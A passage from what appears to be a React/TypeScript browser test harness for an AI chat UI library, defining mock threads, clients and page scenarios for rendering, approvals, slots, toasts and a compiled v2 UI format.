        <div style={{ padding: "0 22px", borderBottom: "1px solid rgba(20,21,26,.08)", display: "flex", gap: 16, fontSize: 13.5 }}>
          <span style={{ padding: "12px 2px", borderBottom: "2px solid #14151a", fontWeight: 600 }}>Chat</span>
          <span style={{ padding: "12px 2px", color: "#8a8b92" }}>+</span>
        </div>
        <div style={{ flex: 1, minHeight: 0 }}>{children}</div>
      </div>
    </div>
  );
}

const MAPLE_SUGGESTIONS = [
  "What did I spend money on when I should've been asleep?",
  "What was that $87 DoorDash charge?",
  "Put me on blast in Slack when I order late-night delivery",
];

/** ENG-231 — several shipped surfaces mounted on ONE page at once: the palette
 *  keybinding must stay a singleton (never double-fire), the overlay must open,
 *  and a filled slot + thread must coexist without style/DOM collisions. */
function ConcurrentScenario() {
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <div style={{ display: "grid", gap: 16, padding: 16 }}>
        <VendoSlot id="concurrent-slot" pin={{ payload: pinnedViewTree }}>
          <div>host fallback</div>
        </VendoSlot>
        <div style={{ height: 320, display: "flex", flexDirection: "column", border: "1px solid #cad3e0", borderRadius: 12, overflow: "hidden" }}>
          <VendoThread threadId="thr_1" />
        </div>
        <VendoPalette />
        <VendoOverlay />
      </div>
    </VendoProvider>
  );
}

function LandingScenario() {
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <MapleFrame>
        <VendoThread greeting="What do you want to build?" suggestions={MAPLE_SUGGESTIONS} onVoice={() => undefined} />
      </MapleFrame>
    </VendoProvider>
  );
}

/** Containment (c): an unregistered formatVersion must render a contained notice
 *  both when handed straight to the renderer AND when it arrives in a thread. */
function UnknownFormatScenario() {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  return (
    <div className="unknown-format-grid">
      <section aria-label="Unknown format direct">
        <h2>Direct renderer</h2>
        <PayloadView
          payload={{ formatVersion: "vendo-genui/v999", root: "root", nodes: [] }}
          components={components}
          onAction={noop}
        />
        <p>Host content after the direct unknown surface survived.</p>
      </section>
      <section aria-label="Unknown format in thread">
        <h2>In a thread</h2>
        <VendoProvider client={threadClient(baseClient, unknownViewThread)} components={components}>
          <VendoThread threadId="thr_unknown" />
        </VendoProvider>
      </section>
    </div>
  );
}

/** Containment (b): a dangling child renders a skeleton; when the streamed node
 *  later arrives, the skeleton swaps in for the real content. */
function StreamCompletionScenario() {
  const [complete, setComplete] = useState(false);
  useEffect(() => {
    const timer = globalThis.setTimeout(() => setComplete(true), 250);
    return () => globalThis.clearTimeout(timer);
  }, []);
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  const streamingTree: Tree = {
    formatVersion: "vendo-genui/v2",
    root: "root",
    nodes: [
      { id: "root", component: "Stack", children: ["late"] },
      ...(complete ? [{ id: "late", component: "Text", props: { text: "Streamed node arrived" } }] : []),
    ],
  };
  return (
    <div data-stream-complete={complete}>
      <TreeView tree={streamingTree} components={components} onAction={noop} />
    </div>
  );
}

/** Containment (d): a pin/app that throws on mount → the VendoSlot error boundary
 *  falls back to the ORIGINAL host component (the children). */
function SlotFallbackScenario() {
  return (
    <VendoProvider client={throwingOpenClient(baseClient)} components={components}>
      <VendoSlot id="hero" appId="app_1">
        <section aria-label="Original host component"><h2>Original host hero</h2><p>Host fallback stayed on screen.</p></section>
      </VendoSlot>
    </VendoProvider>
  );
}

/** A stored v1 tree rendered beside the v2 surface while v1 is being removed
 *  (v2 replaces v1; the remaining v1 surface is deleted across waves 2–4). */
const storedV1Tree: Tree = {
  formatVersion: "vendo-genui/v2",
  root: "root",
  data: { invoice: { total: 4200 } },
  nodes: [
    { id: "root", component: "Stack", props: { gap: 8 }, children: ["heading", "amount"] },
    { id: "heading", component: "Text", props: { text: "Stored v0 invoice", variant: "heading" } },
    { id: "amount", component: "Text", props: { text: { $path: "/invoice/total" } } },
  ],
};

/**
 * WAVE 1 GATE (v2 spec §8, docs/superpowers/specs/2026-07-18-vendo-v2-format-spec.md):
 * a hand-written JSX wire compiles IN THE PAGE with the real compiler and
 * renders through the same PayloadView dispatch as every stored payload —
 * side-by-side with a stored v1 tree to prove coexistence. Covers queries →
 * `$path` bindings, host-brand-wins resolution, a jailed generated island,
 * and a compiler-emitted action dispatching through onAction.
 */
const V2_WIRE = `<App name="Cash overview">
  <Query id="invoice" tool="billing_invoice"/>
  <Query id="customer" tool="crm_customer"/>
  <Stack gap={14}>
    <Text text="Cash overview (compiled from the v2 JSX wire)" variant="heading"/>
    <HostCard title={customer.name} total={invoice.total}/>
    <Grid columns={2}>
      <Card title="Why this renders">
        <Text text="Wire -> compiler -> vendo-genui/v2 tree -> the shared v1 walk."/>
      </Card>
      <RevenueNote/>
    </Grid>
    <Button label="Send reminder" onClick="fn:send_reminder"/>
  </Stack>
  <Island name="RevenueNote">
export default function RevenueNote() {
  return <p>Generated island: reminder drafts are ready.</p>;
}
  </Island>
</App>`;

function TreeV2Scenario() {
  const [action, setAction] = useState<{ nodeId: string; action: string; payload?: Json }>();
  const compiled = useMemo(() => compileWireV2(V2_WIRE, { hostComponents: ["HostCard"] }), []);
  const payload = useMemo(
    () => ({ ...compiled.tree, components: compiled.components }) as unknown as UIPayload,
    [compiled],
  );
  const onAction = async (request: { nodeId: string; action: string; payload?: Json }): Promise<ToolOutcome> => {
    setAction(request);
    return { status: "ok", output: { recorded: true } };
  };
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  return (
    <TreeThemeBoundary>
      <div className="format-drill-grid">
        <section aria-label="v2 wire surface">
          <h2>vendo-genui/v2 — compiled from the wire</h2>
          <PayloadView
            payload={payload}
            components={components}
            data={{ invoice: { total: 4200 }, customer: { name: "Ada Lovelace" } }}
            onAction={onAction}
          />
          <output className="recorder" data-testid="v2-compile-recorder">
            {`compile: complete=${compiled.complete} issues=${compiled.issues.length}`}
          </output>
          <output className="recorder" data-testid="v2-action-recorder">
            {action ? JSON.stringify(action) : "No action recorded"}
          </output>
        </section>
        <section aria-label="Stored v1 tree">
          <h2>vendo-genui/v2 — stored app (coexistence)</h2>
          <PayloadView payload={storedV1Tree as unknown as UIPayload} components={components} onAction={noop} />
        </section>
      </div>
    </TreeThemeBoundary>
  );
}

/** v2 spec §3 (wave 3) — shape-aware binding: reshape pipes adapt the tool's
 *  rows without a code island; a mislabeled field is caught at compile when
 *  shape cards are supplied, and contained at render when they are not. */
const SHAPE_DATA: Record<string, Json> = {
  revenue: {
    rows: [
      { month: "Jan", revenue: 1240 },
      { month: "Feb", revenue: 980 },
      { month: "Mar", revenue: 1495.5 },
    ],
  },
};

const SHAPE_WIRE = `<App name="Revenue by month">
  <Query id="revenue" tool="metrics_revenue"/>
  <Stack gap={14}>
    <Text text="Shape-aware binding: reshape pipes, no code island" variant="heading"/>
    <Stat label="Total revenue" value={revenue.rows | sum(revenue) | format(currency)}/>
    <Table caption="Monthly revenue" rows={revenue.rows | format(revenue, currency) | rename(month, Month, revenue, Revenue)}/>
  </Stack>
</App>`;

/** The broken-chart class: the model guessed field names ("period"/"amount")
 *  that the tool's rows don't carry. */
const SHAPE_WIRE_BROKEN = `<App name="Revenue by month (mis-bound)">
  <Query id="revenue" tool="metrics_revenue"/>
  <Stack gap={14}>
    <Text text="Mis-bound reshape: contained at render, compile error with shape cards" variant="heading"/>
    <Table caption="Broken binding" rows={revenue.rows | asPoints(period, amount)}/>
  </Stack>
</App>`;

function TreeV2ShapeScenario() {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  // The shape card comes straight from the scripted sample — the same
  // deriveShapeCard path `vendo sync`/the engine uses on recorded responses.
  const toolShapes = useMemo(
    () => ({ metrics_revenue: deriveShapeCard("metrics_revenue", [SHAPE_DATA.revenue]).output }),
    [],
  );
  const happy = useMemo(() => compileWireV2(SHAPE_WIRE, { toolShapes }), [toolShapes]);
  const broken = useMemo(() => compileWireV2(SHAPE_WIRE_BROKEN, { toolShapes }), [toolShapes]);
  const happyPayload = useMemo(() => happy.tree as unknown as UIPayload, [happy]);
  const brokenPayload = useMemo(() => broken.tree as unknown as UIPayload, [broken]);
  return (
    <TreeThemeBoundary>
      <div className="format-drill-grid">
        <section aria-label="Reshaped bindings">
          <h2>Reshape pipes against the tool shape — wired, no island</h2>
          <PayloadView payload={happyPayload} components={components} data={SHAPE_DATA} onAction={noop} />
          <output className="recorder" data-testid="shape-happy-recorder">
            {`compile: complete=${happy.complete} issues=${happy.issues.length} bindingErrors=${happy.bindingErrors.length}`}
          </output>
        </section>
        <section aria-label="Mis-bound reshape">
          <h2>Mis-bound fields — compile error + contained notice</h2>
          <PayloadView payload={brokenPayload} components={components} data={SHAPE_DATA} onAction={noop} />
          <output className="recorder" data-testid="shape-error-recorder">
            {JSON.stringify(broken.bindingErrors, null, 1)}
          </output>
        </section>
      </div>
    </TreeThemeBoundary>
  );
}

/** A second long conversation for the thread-SWITCH scenario (ENG-213): both
 *  ids ride the wire list() via the client override below. */
const boundedThreadB: Thread = {
  ...boundedThread,
  id: "thr_1b",
  messages: boundedThread.messages.slice(0, -1).map(message => ({
    ...message,
    id: `${message.id}_b`,
  })),
};

/** Serves BOTH bounded fixtures: get() by id and a list() that includes them,
 *  so useVendoThread adopts either when the scenario switches threads. */
function boundedThreadsClient(client: VendoClient): VendoClient {
  const fixtures = new Map([[boundedThread.id, boundedThread], [boundedThreadB.id, boundedThreadB]]);
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => fixtures.get(id) ?? client.threads.get(id),
      list: async () => [...fixtures.values()].map(thread => ({
        id: thread.id,
        title: "Bounded fixture thread",
        updatedAt: thread.updatedAt,
      })),
    },
  };
}

/** ENG-212: the Cadence /assistant host shape — a bounded, overflow-hidden flex
 *  pane owning the height. The root must forward that height so .fl-msglist is
 *  the scroll container and the composer + approval actions stay reachable.
 *  The switch button drives the ENG-213 thread-change reset: the new thread
 *  must open at its latest turn even after a scroll-up in the previous one. */
function BoundedThreadScenario() {
  const [activeThread, setActiveThread] = useState(boundedThread.id);
  return (
    <VendoProvider client={boundedThreadsClient(baseClient)} components={components}>
      <button
        type="button"
        data-testid="switch-thread"
        onClick={() => setActiveThread(current => current === boundedThread.id ? boundedThreadB.id : boundedThread.id)}
      >
        Switch conversation
      </button>
      <div
        data-testid="bounded-pane"
        style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
          border: "1px solid #cad3e0", borderRadius: 12 }}
      >
        <VendoThread threadId={activeThread} />
      </div>
    </VendoProvider>
  );
}

/** ENG-218 — an EXTREME thread: 200 turns (400 messages), one enormous
 *  markdown message, and an approval whose input arg is a huge blob. Proves the
 *  thread stays solid — windowed DOM, gated entrance animation, truncated huge
 *  bodies and bounded payload previews. */
const HUGE_MARKDOWN = Array.from({ length: 400 }, (_, index) =>
  `Paragraph ${index + 1}: this is a very long assistant response with **bold** spans, `
  + "`inline code`, and enough prose to blow past the collapse cap several times over "
  + "so the truncate/expand affordance and the markdown-cost bound both engage.").join("\n\n");
const HUGE_ARG = JSON.stringify(
  Array.from({ length: 4000 }, (_, index) => ({ row: index, note: `line ${index} of a dumped export` })),
);
const extremeThread: Thread = {
  id: "thr_extreme",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    ...Array.from({ length: 200 }, (_, index) => [
      {
        id: `x_u${index}`,
        role: "user" as const,
        parts: [{ type: "text" as const, text: `Question ${index + 1}: what happened this month?` }],
      },
      {
        id: `x_a${index}`,
        role: "assistant" as const,
        parts: [{
          type: "text" as const,
          text: `Answer ${index + 1}: the largest categories were groceries, subscriptions and delivery.`,
        }],
      },
    ]).flat(),
    {
      id: "x_huge",
      role: "assistant",
      parts: [{ type: "text", text: HUGE_MARKDOWN }],
    },
    {
      id: "x_pending",
      role: "assistant",
      parts: [
        { type: "text", text: "I prepared a bulk export and need your approval before sending." },
        {
          type: "dynamic-tool",
          toolName: "host_email_send",
          toolCallId: "call_extreme",
          state: "approval-requested",
          input: { to: "finance@example.com", subject: "Export", rows: HUGE_ARG },
          approval: { id: "apr_extreme" },
        },
        {
          type: "data-vendo-approval",
          data: { toolCallId: "call_extreme", risk: "write", approvalId: "apr_extreme" },
        },
      ],
    },
  ],
};

function extremeThreadClient(client: VendoClient): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === extremeThread.id ? extremeThread : client.threads.get(id),
      list: async () => [{ id: extremeThread.id, title: "Extreme fixture thread", updatedAt: extremeThread.updatedAt }],
    },
  };
}

function ExtremeThreadScenario() {
  return (
    <VendoProvider client={extremeThreadClient(baseClient)} components={components}>
      <div
        data-testid="bounded-pane"
        style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
          border: "1px solid #cad3e0", borderRadius: 12 }}
      >
        <VendoThread threadId={extremeThread.id} />
      </div>
    </VendoProvider>
  );
}

/** ENG-215 — a clean two-turn thread (no tools/approvals) so the composer's
 *  edit-last / regenerate / autogrow / queued-send behaviors read without the
 *  approval clutter of the canned wire turn. */
const composerThread: Thread = {
  id: "thr_composer",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    {
      id: "cmp_u1",
      role: "user",
      parts: [{ type: "text", text: "Draft a friendly welcome email for new Maple customers." }],
    },
    {
      id: "cmp_a1",
      role: "assistant",
      parts: [{
        type: "text",
        text: "Here's a warm welcome email you can send to new Maple customers. It opens with a "
          + "greeting, points them at their first three actions, and closes with a human sign-off "
          + "so it never reads like an autoresponder.",
      }],
    },
  ],
};

/** Serves the clean composer thread by id and in list() so useVendoThread adopts it. */
function composerThreadClient(client: VendoClient): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === composerThread.id ? composerThread : client.threads.get(id),
      list: async () => [{ id: composerThread.id, title: "Welcome email", updatedAt: composerThread.updatedAt }],
    },
  };
}

function ComposerScenario({ theme }: { theme: Partial<VendoTheme> }) {
  return (
    <VendoProvider client={composerThreadClient(baseClient)} components={components} theme={theme}>
      <div style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
        border: "1px solid var(--vendo-border)", borderRadius: 12 }}>
        <VendoThread threadId="thr_composer" />
      </div>
    </VendoProvider>
  );
}

/** ENG-216 — the humanization showcase, in a Maple-brand host with host tool
 *  metadata supplied via the VendoProvider `tools` seam. */
function HumanizedThreadScenario() {
  return (
    <VendoProvider
      client={threadClient(baseClient, humanizedThread)}
      components={components}
      theme={mapleTheme}
      tools={humanizedTools}
    >
      <VendoThread threadId="thr_humanized" />
    </VendoProvider>
  );
}

/** ENG-225 — a clean thread whose assistant turn carries a fenced code block, so
 *  the copy affordances (turn copy + code copy) read together in one capture. */
const affordancesThread: Thread = {
  id: "thr_affordances",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    {
      id: "aff_u1",
      role: "user",
      parts: [{ type: "text", text: "Give me a snippet that fetches this month's invoices." }],
    },
    {
      id: "aff_a1",
      role: "assistant",
      parts: [{
        type: "text",
        text: "Here's a snippet that pulls the current month's invoices:\n\n"
          + "```ts\nconst invoices = await maple.invoices.list({\n  month: \"2026-07\",\n  status: \"outstanding\",\n});\n```\n\n"
          + "Run it with your sandbox key first.",
      }],
    },
  ],
};

function affordancesThreadClient(client: VendoClient): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === affordancesThread.id ? affordancesThread : client.threads.get(id),
      list: async () => [{ id: affordancesThread.id, title: "Invoice snippet", updatedAt: affordancesThread.updatedAt }],
    },
  };
}

/** ENG-225 — the affordance showcase: copy actions, code copy, drag-drop attach,
 *  image previews and the connect dock/tray, in a bounded Maple-brand pane. */
function AffordancesScenario({ theme }: { theme: Partial<VendoTheme> }) {
  return (
    <VendoProvider
      client={affordancesThreadClient(baseClient)}
      components={components}
      theme={theme}
      connectors={[
        { toolkit: "gmail", label: "Gmail" },
        { toolkit: "slack", label: "Slack" },
        { toolkit: "quickbooks", label: "QuickBooks" },
      ]}
    >
      <div style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
        border: "1px solid var(--vendo-border)", borderRadius: 12 }}>
        <VendoThread threadId="thr_affordances" />
      </div>
    </VendoProvider>
  );
}

/** ENG-225 — the waiting-on-you queue over the wire fixture's pending approval. */
function WaitingScenario() {
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <WaitingQueue pollMs={0} />
    </VendoProvider>
  );
}

/** ENG-225 — the toast stack: an automation delivery, an error, and a sticky
 *  approval-required card with its in-place Approve. */
function ToastsScenario() {
  useEffect(() => {
    vendoToast({ text: "Invoice watcher ran: 3 reminders drafted and queued for review.", durationMs: 0, actions: [{ label: "View", onAction: () => undefined }] });
    vendoToast({ text: "Morning digest failed to send — the connected inbox returned an error.", state: "error", durationMs: 0 });
    vendoToast({ kind: "approval-required", text: "Waiting on you: Send email to finance@example.com", hint: "recorded in Activity", actions: [{ label: "Approve", primary: true, onAction: () => undefined }] });
  }, []);
  return (
    <VendoProvider client={baseClient} components={components} theme={mapleTheme}>
      <p style={{ fontFamily: "Inter, ui-sans-serif, sans-serif", fontSize: 14, color: "#5b5c63" }}>
        Host page content — the toasts stack over it, bottom-right.
      </p>
      <VendoToasts />
    </VendoProvider>
  );
}

/** ENG-223 — a pinned generated view (a vendo-genui/v2 tree) mounted in the slot
 *  in place of the host's original hero, through the pin path + error boundary. */
const pinnedViewTree: UIPayload = {
  formatVersion: "vendo-genui/v2",
  root: "root",
  nodes: [
    { id: "root", component: "Surface", children: ["stack"] },
    { id: "stack", component: "Stack", props: { gap: 10 }, children: ["title", "amount", "sub"] },
    { id: "title", component: "Text", props: { text: "Outstanding this week", variant: "heading" } },
    { id: "amount", component: "Text", props: { text: "$18,420 across 6 clients" } },
    { id: "sub", component: "Text", props: { text: "Pinned from a remix — refreshed every morning at 9am." } },
  ],
};

function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme>; content: ReactNode; ownProvider?: boolean } {
  switch (pathname) {
    case "/thread": return { title: "Thread — dark theme", theme: darkTheme, content: <VendoThread threadId="thr_1" /> };
    case "/thread-voice-stack": return { title: "Thread + Voice stage — stacked (Maple /vendo)", content: <ThreadVoiceStackScenario />, ownProvider: true };
    case "/composer": return { title: "Composer (Maple)", content: <ComposerScenario theme={mapleTheme} />, ownProvider: true };
    case "/composer-dark": return { title: "Composer — dark", content: <ComposerScenario theme={darkTheme} />, ownProvider: true };
    case "/thread-bounded": return { title: "Thread — bounded host pane", content: <BoundedThreadScenario />, ownProvider: true };
    case "/thread-extreme": return { title: "Thread — extreme content", content: <ExtremeThreadScenario />, ownProvider: true };
    case "/thread-landing": return { title: "Landing (Maple host)", content: <LandingScenario />, ownProvider: true };
    case "/thread-humanized": return { title: "Thread — humanized (host metadata)", content: <HumanizedThreadScenario />, ownProvider: true };
    case "/overlay": return { title: "Overlay", content: <AutoOpen selector='button[aria-controls="vendo-overlay-dialog"]'><VendoOverlay /></AutoOpen> };
    case "/overlay-manual": return { title: "Overlay — manual launcher", content: <VendoOverlay /> };
    case "/concurrent": return { title: "Concurrent surfaces", content: <ConcurrentScenario />, ownProvider: true };
    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector='[role="tab"][aria-controls="vendo-panel-apps"]'><VendoPage /></AutoOpen> };
    case "/page-chat": return { title: "Workspace — Chat (thread sidebar)", theme: mapleTheme, content: <VendoPage /> };
    case "/page-chat-dark": return { title: "Workspace — Chat (dark)", theme: darkTheme, content: <VendoPage /> };
    case "/palette": return { title: "Command palette", content: <OpenPalette /> };
    case "/palette-host": return { title: "Palette — host input collision", content: <PaletteHostInputScenario /> };
    case "/approval": return { title: "Destructive approval", content: <ApprovalScenario /> };
    case "/activity": return { title: "Activity", content: <ActivityPanel /> };
    case "/activity-dark": return { title: "Activity — dark", theme: darkTheme, content: <ActivityPanel /> };
    case "/automations": return { title: "Automations", content: <AutomationsPanel /> };
    case "/notice": return { title: "Unconfigured policy", ownProvider: true, content: (<VendoProvider client={unconfiguredClient} components={components}><NoPolicyNotice /></VendoProvider>) };
    case "/stage": return { title: "Voice stage", content: <StageScenario />, ownProvider: true };
    case "/stage-live": return { title: "Voice stage (live)", content: <LiveStageScenario />, ownProvider: true };
    case "/stage-full": return { title: "Voice stage — views + consent (Maple)", content: <VoiceShowcaseScenario script={VOICE_SHOWCASE_SCRIPT} />, ownProvider: true };
    case "/stage-full-dark": return { title: "Voice stage — dark", content: <VoiceShowcaseScenario script={VOICE_SHOWCASE_SCRIPT} theme={darkTheme} />, ownProvider: true };
    case "/stage-drawer": return { title: "Voice stage — transcript drawer", content: <VoiceShowcaseScenario script={VOICE_SHOWCASE_SCRIPT} approvals={false} />, ownProvider: true };
    case "/stage-reconnecting": return {
      title: "Voice stage — reconnecting",
      content: <VoiceShowcaseScenario approvals={false} script={[{ type: "state", state: "listening" }, { type: "transcript", entry: { id: "v-user", role: "user", text: "Keep going with the reminders", final: true } }, { type: "state", state: "reconnecting" }]} />,
      ownProvider: true,
    };
    case "/stage-error": return {
      title: "Voice stage — error",
      content: <VoiceShowcaseScenario approvals={false} script={[{ type: "error", error: { message: "Microphone permission was denied — allow the mic and retry." } }]} />,
      ownProvider: true,
    };
    case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
    case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
    case "/tree-inclient": return { title: "In-client venue (hash-pinned approval)", content: <InClientScenario /> };
    case "/tree-drift": return { title: "Pin drift (host component updated)", content: <PinDriftScenario /> };
    case "/tree-themed": return { title: "Tree — loud host theme", theme: loudTheme, content: <TreeScenario /> };
    case "/tree-stream": return { title: "Streaming completion", content: <StreamCompletionScenario /> };
    case "/tree-v2": return { title: "vendo-genui/v2 — wire compile + v1 coexistence", content: <TreeV2Scenario /> };
    case "/tree-v2-shape": return { title: "vendo-genui/v2 — shape-aware binding (wave 3)", content: <TreeV2ShapeScenario /> };
    case "/unknown-format": return { title: "Unknown UI format", content: <UnknownFormatScenario />, ownProvider: true };
    case "/slot": return { title: "Inline app slot", content: <VendoSlot id="hero" appId="app_1"><section aria-label="Original host component"><h2>Original host hero</h2></section></VendoSlot> };
    case "/slot-empty": return { title: "Inline slot — empty CTA (Maple)", theme: mapleTheme, content: <><VendoSlot id="hero" /><VendoPalette /></> };
    case "/slot-empty-dark": return { title: "Inline slot — empty CTA (dark)", theme: darkTheme, content: <><VendoSlot id="hero" /><VendoPalette /></> };
    case "/slot-pinned": return { title: "Inline slot — pinned component", theme: mapleTheme, content: <VendoSlot id="hero" pin={{ payload: pinnedViewTree }}><section aria-label="Original host component"><h2>Original host hero</h2></section></VendoSlot> };
    case "/slot-fallback": return { title: "Slot pin fallback", content: <SlotFallbackScenario />, ownProvider: true };
    case "/appframe": return { title: "App execution planes", content: <AppFrameScenario /> };
    case "/affordances": return { title: "Affordances (Maple) — copy, attach, connect dock", content: <AffordancesScenario theme={mapleTheme} />, ownProvider: true };
    case "/affordances-dark": return { title: "Affordances — dark", content: <AffordancesScenario theme={darkTheme} />, ownProvider: true };
    case "/waiting": return { title: "Waiting on you", content: <WaitingScenario />, ownProvider: true };
    case "/toasts": return { title: "Toasts", content: <ToastsScenario />, ownProvider: true };
    default: return { title: "Unknown scenario", content: <p role="alert">Unknown browser scenario: {pathname}</p> };
  }
}

function Harness() {
  const current = scenario(globalThis.location.pathname);
  const content = current.ownProvider
    ? current.content
    : (
      <VendoProvider
        client={globalThis.location.pathname === "/thread" ? threadClient(baseClient, pendingThread) : baseClient}
        components={components}
        theme={current.theme}
      >
        {current.content}
      </VendoProvider>
    );
  // Full-bleed host-frame scenarios (the Maple frame IS the host chrome) render
  // edge-to-edge, not as a card on the harness canvas.
  if (globalThis.location.pathname === "/thread-landing") {
    return <div data-scenario="thread-landing" style={{ position: "fixed", inset: 0 }}>{content}</div>;
  }
  return (
    <main className={`harness-shell${globalThis.location.pathname === "/thread" || globalThis.location.pathname === "/activity-dark" ? " harness-dark" : ""}`} data-scenario={globalThis.location.pathname.slice(1)}>
      <h1 className="harness-heading">{current.title}</h1>
      <div className="harness-surface">{content}</div>
    </main>
  );
}

const root = document.getElementById("root");
if (!root) throw new Error("Browser harness root is missing.");
createRoot(root).render(<Harness />);
